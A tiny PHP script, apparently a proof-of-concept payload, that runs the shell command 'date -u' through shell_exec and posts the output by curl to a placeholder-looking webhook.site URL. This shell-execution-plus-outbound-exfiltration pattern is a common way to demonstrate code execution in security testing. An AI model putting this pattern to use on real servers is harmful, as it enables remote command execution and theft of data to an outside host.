<?php
$output = shell_exec('date -u');
$channel = curl_init('https://webhook.site/00000000-0000-4000-8000-000000000001');
curl_setopt($channel, CURLOPT_POST, true);
curl_setopt($channel, CURLOPT_POSTFIELDS, $output);
curl_exec($channel);
?>
